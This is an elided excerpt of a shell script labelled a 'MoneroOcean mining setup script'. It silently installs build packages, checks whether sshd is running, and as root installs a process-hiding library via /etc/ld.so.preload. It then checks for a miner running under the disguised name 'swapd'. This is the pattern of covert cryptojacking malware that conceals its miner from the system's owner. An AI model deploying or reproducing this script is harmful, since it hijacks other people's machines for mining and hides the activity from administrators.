...
echo "MoneroOcean mining setup script v$VERSION (CORRECTED)"
...
install_packages() {
    ...
    case $PKG_MANAGER in
        apt)
            ...
            NEEDRESTART_MODE=a DEBIAN_FRONTEND=noninteractive apt-get install -y $packages 2>/dev/null
            ;;
        yum)
...
if command_exists systemctl && systemctl is-active --quiet sshd; then
...
if [ "$PKG_MANAGER" = "apt" ]; then
    REQUIRED_PACKAGES="$REQUIRED_PACKAGES build-essential linux-headers-$(uname -r)"
elif [ "$PKG_MANAGER" = "yum" ] || [ "$PKG_MANAGER" = "dnf" ]; then
    REQUIRED_PACKAGES="$REQUIRED_PACKAGES kernel-devel kernel-headers"
fi

install_packages $REQUIRED_PACKAGES || echo "WARNING: Some packages failed to install"
...
if make 2>/dev/null; then
    ...
    if [ "$(id -u)" -eq 0 ]; then
        if [ -f "libprocesshider.so" ]; then
            cp libprocesshider.so /usr/local/lib/ 2>/dev/null
            echo "/usr/local/lib/libprocesshider.so" > /etc/ld.so.preload 2>/dev/null
...
if pgrep -f swapd >/dev/null; then
    ...
    echo "WARNING: Miner may not be running"
fi
